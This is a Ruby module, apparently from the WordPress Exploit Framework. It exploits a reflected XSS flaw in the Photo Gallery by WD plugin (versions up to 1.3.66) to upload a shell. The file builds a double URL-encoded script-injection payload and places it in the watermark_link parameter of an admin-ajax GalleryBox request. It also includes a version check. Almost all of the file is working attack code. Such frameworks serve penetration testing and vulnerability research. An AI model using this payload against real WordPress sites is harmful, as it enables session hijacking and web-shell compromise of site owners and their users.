# frozen_string_literal: true

class Wpxf::Exploit::PhotoGalleryReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::ReflectedXss

  def initialize
    super

    update_info(
      name: 'Photo Gallery by WD <= 1.3.66 Reflected XSS Shell Upload',
      author: [
        'Karim El Ouerghemmi', # Dislosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '9031']
      ],
      date: 'Feb 22 2018'
    )

    register_options([
      IntegerOption.new(
        name: 'gallery_id',
        desc: 'A valid Photo Gallery gallery ID',
        required: true
      ),
      IntegerOption.new(
        name: 'image_id',
        desc: 'A valid ID of an image within the chosen gallery',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('photo-gallery', '1.3.67')
  end

  def xss_payload
    url_encode(url_encode("\"><script>#{xss_ascii_encoded_include_script}</script>"))
  end

  def url_with_xss
    "#{wordpress_url_admin_ajax}?action=GalleryBox&gallery_id=#{datastore['gallery_id']}&image_id=#{datastore['image_id']}&watermark_link=#{xss_payload}&watermark_type=image"
  end
end
